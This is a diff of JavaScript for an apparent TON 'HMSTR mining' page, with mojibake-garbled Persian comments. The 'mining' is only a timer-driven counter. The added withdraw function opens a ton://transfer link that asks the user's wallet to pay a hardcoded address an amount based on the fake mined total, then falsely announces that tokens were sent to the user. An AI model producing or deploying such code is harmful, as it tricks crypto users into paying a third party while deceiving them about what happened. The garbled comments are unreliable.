@@ -1,54 +1,52 @@
+// TON Web setup
 const tonweb = new TonWeb(new TonWeb.HttpProvider('https://testnet.toncenter.com/api/v2/jsonRPC'));
-const wallet = tonweb.wallet.create({ publicKey: 'YOUR_PUBLIC_KEY' }); // ˜íİ æá ˜ÇÑÈÑ
-const hmstrTokenAddress = 'HMSTR_TOKEN_CONTRACT_ADDRESS';  // ÂÏÑÓ ŞÑÇÑÏÇÏ Êæ˜ä HMSTR
+const wallet = tonweb.wallet.create({ publicKey: 'YOUR_PUBLIC_KEY' }); // Ú©ÛŒÙ Ù¾ÙˆÙ„ Ú©Ø§Ø±Ø¨Ø±
+const hmstrTokenAddress = 'HMSTR_TOKEN_CONTRACT_ADDRESS';  // Ø¢Ø¯Ø±Ø³ Ù‚Ø±Ø§Ø±Ø¯Ø§Ø¯ ØªÙˆÚ©Ù† HMSTR
 
-let totalMined = 0; // ãŞÏÇÑ ˜á ÇÓÊÎÑÇÌ ÔÏå
-let startTime = null; // ÒãÇä ÔÑæÚ ÇÓÊÎÑÇÌ
-let miningInterval = null; // ÇíäÊÑÇá ÈÑÇí ÂÏíÊ ˜ÑÏä ãŞÏÇÑ ÇÓÊÎÑÇÌ
-let miningSpeed = 0; // ÓÑÚÊ ÇÓÊÎÑÇÌ Çæáíå (0 Êæ˜ä ÏÑ ÓÇÚÊ)
+let totalMined = 0; // Ù…Ù‚Ø¯Ø§Ø± Ú©Ù„ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø´Ø¯Ù‡
+let startTime = null; // Ø²Ù…Ø§Ù† Ø´Ø±ÙˆØ¹ Ø§Ø³ØªØ®Ø±Ø§Ø¬
+let miningInterval = null; // Ø§ÛŒÙ†ØªØ±Ø§Ù„ Ø¨Ø±Ø§ÛŒ Ø¢Ù¾Ø¯ÛŒØª Ú©Ø±Ø¯Ù† Ù…Ù‚Ø¯Ø§Ø± Ø§Ø³ØªØ®Ø±Ø§Ø¬
+let miningSpeed = 0.001; // Ø³Ø±Ø¹Øª Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§ÙˆÙ„ÛŒÙ‡ (0.001 ØªÙˆÚ©Ù† Ø¯Ø± Ø«Ø§Ù†ÛŒÙ‡)
 
-// ÂÏÑÓ ˜íİ æá ãŞÕÏ (ÈÑÇí ãËÇá¡ ÂÏÑÓ Tonkeeper)
+// Ø¢Ø¯Ø±Ø³ Ú©ÛŒÙ Ù¾ÙˆÙ„ Ù…Ù‚ØµØ¯ (Ø¨Ø±Ø§ÛŒ Ù…Ø«Ø§Ù„ØŒ Ø¢Ø¯Ø±Ø³ Tonkeeper)
 const targetWallet = 'UQBGPcjpLyLOkCjdMt2mw-f1adTJZZTV4AOwM90edhSRjjN3';
 
-// ÊÇÈÚ ÔÑæÚ ÇÓÊÎÑÇÌ
+// ØªØ§Ø¨Ø¹ Ø´Ø±ÙˆØ¹ Ø§Ø³ØªØ®Ø±Ø§Ø¬
 function startMining() {
     const amount = document.getElementById('amount').value;
     const resultDiv = document.getElementById('result');
     const speedDiv = document.getElementById('speed');
     const minedDiv = document.getElementById('mined');
 
-    // ÇÚÊÈÇÑÓäÌí ãŞÏÇÑ æÇÑÏ ÔÏå
+    // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ù…Ù‚Ø¯Ø§Ø± ÙˆØ§Ø±Ø¯ Ø´Ø¯Ù‡
     if (!amount || isNaN(amount) || amount <= 0) {
         resultDiv.innerHTML = 'Please enter a valid amount of HMSTR tokens.';
         return;
     }
 
-    // ãÍÇÓÈå ÓÑÚÊ ÇÓÊÎÑÇÌ ÌÏíÏ (Èå ÇÒÇí åÑ Êæ˜ä 1 ÓÇÚÊ í˜ Êæ˜ä ÇÓÊÎÑÇÌ ãíÔæÏ)
-    miningSpeed = amount;  // Èå ÇÒÇí åÑ 1 Êæ˜ä¡ 1 Êæ˜ä ÏÑ ÓÇÚÊ ÇÓÊÎÑÇÌ ãíÔæÏ
-
-    // ÒãÇäí ˜å ÇÓÊÎÑÇÌ ÔÑæÚ ÔÏå ÇÓÊ
+    // Ø²Ù…Ø§Ù†ÛŒ Ú©Ù‡ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø´Ø±ÙˆØ¹ Ø´Ø¯Ù‡ Ø§Ø³Øª
     startTime = Date.now();
 
-    // ÊÇÈÚ ÈåÑæÒÑÓÇäí ÓÑÚÊ ÇÓÊÎÑÇÌ
+    // ØªØ§Ø¨Ø¹ Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ Ø³Ø±Ø¹Øª Ø§Ø³ØªØ®Ø±Ø§Ø¬
     miningInterval = setInterval(function() {
-        const elapsedTimeInSeconds = (Date.now() - startTime) / 1000; // ÒãÇä ĞÔÊå Èå ËÇäíå
-        const tokensMined = (miningSpeed / 3600) * elapsedTimeInSeconds; // ãŞÏÇÑ Êæ˜ä ÇÓÊÎÑÇÌÔÏå ÈÑ ÇÓÇÓ ÒãÇä
+        const elapsedTimeInSeconds = (Date.now() - startTime) / 1000; // Ø²Ù…Ø§Ù† Ú¯Ø°Ø´ØªÙ‡ Ø¨Ù‡ Ø«Ø§Ù†ÛŒÙ‡
+        const tokensMined = miningSpeed * elapsedTimeInSeconds; // Ù…Ù‚Ø¯Ø§Ø± ØªÙˆÚ©Ù† Ø§Ø³ØªØ®Ø±Ø§Ø¬â€ŒØ´Ø¯Ù‡ Ø¨Ø± Ø§Ø³Ø§Ø³ Ø²Ù…Ø§Ù†
 
-        // Èå ÑæÒ ÑÓÇäí ÇØáÇÚÇÊ
-        totalMined = Math.min(tokensMined, amount); // ÇÒ ãŞÏÇÑ ÑÏÇÎÊ ÔÏå ÈíÔÊÑ ÇÓÊÎÑÇÌ äãíÔæÏ
+        // Ø¨Ù‡ Ø±ÙˆØ² Ø±Ø³Ø§Ù†ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª
+        totalMined = Math.min(tokensMined, 30); // Ø§Ø² 30 ØªÙˆÚ©Ù† Ø¨ÛŒØ´ØªØ± Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯
 
-        speedDiv.innerHTML = `Mining Speed: ${miningSpeed} tokens/hr`;
+        speedDiv.innerHTML = `Mining Speed: ${miningSpeed.toFixed(5)} tokens/hour`;
         minedDiv.innerHTML = `Total Mined: ${totalMined.toFixed(5)} HMSTR`;
 
-        // ÇÑ ÇÓÊÎÑÇÌ ˜Çãá ÔÏ
-        if (totalMined >= amount) {
+        // Ø§Ú¯Ø± Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ú©Ø§Ù…Ù„ Ø´Ø¯
+        if (totalMined >= 30) {
             clearInterval(miningInterval);
-            resultDiv.innerHTML = `Mining complete! You have mined ${amount} HMSTR tokens.`;
+            resultDiv.innerHTML = 'Mining complete! You have mined 30 HMSTR tokens.';
         }
-    }, 1000); // ÈåÑæÒÑÓÇäí åÑ 1 ËÇäíå
+    }, 100); // Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ Ù‡Ø± 100 Ù…ÛŒÙ„ÛŒâ€ŒØ«Ø§Ù†ÛŒÙ‡ (Ø¨Ø±Ø§ÛŒ Ø±ÙˆØ§Ù† Ø¨ÙˆØ¯Ù† Ø§Ù†ÛŒÙ…ÛŒØ´Ù†)
 }
 
-// ÊÇÈÚ ÇİÒÇíÔ ÓÑÚÊ ÇÓÊÎÑÇÌ (Boost)
+// ØªØ§Ø¨Ø¹ Ø§ÙØ²Ø§ÛŒØ´ Ø³Ø±Ø¹Øª Ø§Ø³ØªØ®Ø±Ø§Ø¬ (Boost)
 function boostMining() {
     const boostAmount = document.getElementById('amount').value;
     if (!boostAmount || isNaN(boostAmount) || boostAmount <= 0) {
@@ -56,24 +54,42 @@ function boostMining() {
         return;
     }
 
-    // ÇİÒÇíÔ 1 ÏÑÕÏí ÓÑÚÊ ÇÓÊÎÑÇÌ
-    miningSpeed += miningSpeed * 0.01;
+    // Ø§ÙØ²Ø§ÛŒØ´ 1 Ø¯Ø±ØµØ¯ÛŒ Ø³Ø±Ø¹Øª Ø§Ø³ØªØ®Ø±Ø§Ø¬
+    const boostPercentage = 0.01; // Ø§ÙØ²Ø§ÛŒØ´ 1 Ø¯Ø±ØµØ¯
+    miningSpeed += miningSpeed * boostPercentage;
 
-    // ÇäíãíÔä Boost
+    // Ø§Ù†ÛŒÙ…ÛŒØ´Ù† Boost
     const boostBtn = document.querySelector('.boost-btn');
     boostBtn.classList.add('boost-animation');
     setTimeout(() => {
         boostBtn.classList.remove('boost-animation');
-    }, 1000); // ÇäíãíÔä í˜ ËÇäíåÇí
+    }, 1000); // Ø§Ù†ÛŒÙ…ÛŒØ´Ù† ÛŒÚ© Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ
 
-    alert(`Mining speed boosted by 1%! Current speed: ${miningSpeed.toFixed(5)} tokens/hr`);
+    alert(`Mining speed boosted by 1%! Current speed: ${miningSpeed.toFixed(5)} tokens/hour`);
 
-    // Èå ÑæÒ ÑÓÇäí ÇØáÇÚÇÊ
-    document.getElementById('speed').innerText = `Mining Speed: ${miningSpeed.toFixed(5)} tokens/hr`;
+    // Ø¨Ù‡ Ø±ÙˆØ² Ø±Ø³Ø§Ù†ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª
+    document.getElementById('speed').innerText = `Mining Speed: ${miningSpeed.toFixed(5)} tokens/hour`;
 }
 
-// ÊÇÈÚ ÈÑÇí ÈÑÏÇÔÊ
+// ØªØ§Ø¨Ø¹ Ø¨Ø±Ø¯Ø§Ø´Øª
 function withdraw() {
-    alert("Withdrawing mined tokens to your Tonkeeper wallet...");
-    // ÇíäÌÇ ÈÇíÏ ˜ÏåÇí ãÑÈæØ Èå ÈÑÏÇÔÊ Êæ˜ä ÑÇ ÇÖÇİå ˜äíÏ.
+    if (totalMined > 0) {
+        alert(`Withdrawing ${totalMined.toFixed(5)} HMSTR tokens to wallet ${targetWallet}`);
+        // Ø§Ø±Ø³Ø§Ù„ ØªÙˆÚ©Ù†â€ŒÙ‡Ø§ Ø¨Ù‡ Ú©ÛŒÙ Ù¾ÙˆÙ„ Tonkeeper
+        sendTokensToTonkeeper(totalMined);
+    } else {
+        alert('No tokens to withdraw!');
+    }
+}
+
+// Ø§Ø±Ø³Ø§Ù„ ØªÙˆÚ©Ù† Ø¨Ù‡ Ú©ÛŒÙ Ù¾ÙˆÙ„ Tonkeeper
+function sendTokensToTonkeeper(amount) {
+    // ÙØ±Ù…Øª URL Ù¾Ø±ÙˆØªÚ©Ù„ Tonkeeper
+    const tonkeeperUrl = `ton://transfer/${targetWallet}?amount=${Math.round(amount * 1e9)}&text=HMSTR+withdrawal`;
+
+    // Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† Ù„ÛŒÙ†Ú© Ø¨Ø±Ø§ÛŒ Ù‡Ø¯Ø§ÛŒØª Ú©Ø§Ø±Ø¨Ø± Ø¨Ù‡ Ú©ÛŒÙ Ù¾ÙˆÙ„
+    window.location.href = tonkeeperUrl;
+
+    // Ù¾ÛŒØ§Ù… ØªØ§ÛŒÛŒØ¯
+    alert(`Tokens have been sent to your Tonkeeper wallet. Amount: ${amount} HMSTR`);
 }
